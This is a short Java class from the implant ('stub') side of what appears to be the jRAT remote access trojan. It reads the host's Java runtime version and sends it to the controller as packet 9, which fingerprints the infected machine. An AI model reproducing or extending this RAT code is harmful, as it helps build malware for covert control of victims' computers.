package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet9InitJavaVersion extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String version = System.getProperty("java.runtime.version");
		
		sw.writeLine(version);
	}

	@Override
	public byte getPacketId() {
		return (byte) 9;
	}

}
